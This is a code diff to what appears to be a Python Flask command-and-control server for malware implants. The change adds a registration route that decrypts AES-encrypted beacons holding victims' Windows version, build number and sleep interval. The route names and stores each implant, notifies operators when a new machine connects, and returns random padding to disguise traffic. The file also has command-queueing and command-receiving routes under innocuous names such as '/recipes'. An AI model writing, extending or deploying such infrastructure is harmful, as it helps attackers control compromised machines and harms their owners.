@@ -1,4 +1,3 @@
-from ctypes import sizeof
 from modules import encryption
 from modules import server_codes
 from modules import storage
@@ -6,6 +5,7 @@ from datetime import datetime
 import os
 from flask import Flask, request, make_response, jsonify
 from werkzeug.utils import secure_filename
+from typing import Dict
 import random
 import json
 import requests
@@ -45,20 +45,35 @@ def store_and_queue_command(cmd_str: str, implant_command: storage.ImplantComman
     cmd_log = storage.CommandLog(operator_db.dict[operator_name], implant_command)
     commandlog_db.add_command_log(cmd_log)
 
-def pretty_print(clas, indent=0):
-    print(' ' * indent +  type(clas).__name__ +  ':')
-    indent += 4
-    for k,v in clas.__dict__.items():
-        if '__dict__' in dir(v):
-            pretty_print(v,indent)
-        else:
-            print(' ' * indent +  k + ': ' + str(v))   
+# Helper function to update all operators when something 
+# happens, like a new implant connecting
+def update_operators(update_type: server_codes.ServerUpdates,data):
+    for op_name in operator_db.dict:
+        op = operator_db.dict[op_name]
+        url = "/update"
+        update_json = build_operator_update(update_type, data)
+        requests.post("http://"+op.IP+":"+op.port+url, json=update_json)
+
+
+# Helper function to build operator update depending on
+# update type
+def build_operator_update(update_type: server_codes.ServerUpdates, data) -> Dict:
+    match update_type:
+        case server_codes.ServerUpdates.NEW_IMPLANT:
+            # data must be the Implant object
+            return {"update_type": update_type.value, "update_data": data.__dict__}
+        case server_codes.ServerUpdates.NEW_COMMAND_RESPONSE:
+            # data must be the cmd_id
+            return {}
+        case _:
+            return {}
+
+
+
 ### Start the routing ###
 # DEBUG page
 @app.route("/admin/debug")
 def debug():
-    
-
 
     return "debuggy"
 # Default dummy page
@@ -69,7 +84,44 @@ def under_construction():
 # The login route for implants
 @app.route("/login", methods=['POST'])
 def implant_register():
-    return "TODO"
+    #try:
+    # Read in Base64 post data
+    aes_data = request.get_data()
+
+    # Decrypt it
+    data = AES_INSTANCE.decrypt(aes_data)
+    
+    # Extract the major windows version and the build number
+    major_v = data.split(":::")[0]
+    build_num = data.split(":::")[1]
+    sleep_time = data.split(":::")[2]
+
+    print(data)
+
+    # Generate a name
+    new_implant_name = encryption.id_generator(N=4)
+
+    # Add the new implant to the implant_db
+    implant_db.add_implant(storage.Implant(name=new_implant_name,
+                                           major_v=major_v,
+                                           build_num=build_num,
+                                           sleep_time=sleep_time
+                                          ))
+
+    # Update the operators
+    update_operators(server_codes.ServerUpdates.NEW_IMPLANT, implant_db.dict[new_implant_name])
+    print(f"A new implant has connected: {new_implant_name}")
+
+    # Set the first contact time
+    implant_db.dict[new_implant_name].last_checkin = datetime.now()
+
+    # Respond with the new name as a Cookie header and random text
+    response = make_response(encryption.id_generator(random.randint(200,350)))
+    response.headers["Cookie"] = new_implant_name
+    return response
+    #except:
+        #print("An implant tried to log in but the /login endpoint error'ed")
+        #return "ayooo there was an error my guy"
 
 # The command recieve route for implants
 @app.route("/recipes")
